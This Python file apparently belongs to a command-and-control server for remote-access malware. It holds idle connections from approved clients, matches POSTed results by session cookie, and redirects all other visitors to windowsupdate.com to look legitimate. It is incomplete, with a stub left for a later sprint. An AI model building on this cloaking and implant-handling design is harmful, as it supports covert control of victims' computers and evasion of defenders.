import socket
from RuntimeDatabase import RuntimeDatabase
from HttpResponse import HttpResponse
from HttpRequest import HttpRequest
import time


class Handler:
    @staticmethod
    def handle_unknown_source(client_sock):
        """
        This function redirects client to official Microsoft website
        :param client_sock: socket for redirection
        :type client_sock: socket
        :return: None
        """
        response = HttpResponse.generate_redirect_response("http://www.windowsupdate.com/")
        client_sock.send(response.encode())
        client_sock.close()

    @staticmethod
    def handle_approved_source(client_sock, addr, request):
        """
        This function check if this is first time connection and handling it
        :param client_sock: socket of client
        :type client_sock: socket
        :param addr: ip address and port
        :type addr: tuple
        :param request: Http request object
        :type request: HttpRequest
        :return: None
        """
        if request.request_method == "GET":
            try:
                RuntimeDatabase.idle_connections_lock.acquire()
                RuntimeDatabase.idle_connections[addr[0]].close()  # Close previous socket
                RuntimeDatabase.idle_connections_lock.release()
            except KeyError:  # New connection
                pass
            RuntimeDatabase.idle_connections_lock.acquire()
            RuntimeDatabase.idle_connections[addr[0]] = client_sock
            RuntimeDatabase.idle_connections_lock.release()
        if request.request_method == "POST":
            try:  # An other handler waiting for this request
                session_id = request.request_headers['Set-Cookie'].split("=")[1]
                RuntimeDatabase.post_request_events_lock.acquire()
                RuntimeDatabase.post_request_events[session_id].set()
                RuntimeDatabase.post_request_events_lock.release()
            except KeyError:  # Unknown request target
                client_sock.close()
            client_sock.send(HttpResponse.generate_response(200, "").encode())

    @staticmethod
    def handle_cpr(client_sock):
        pass
        # TODO: It's require computer object- next sprint
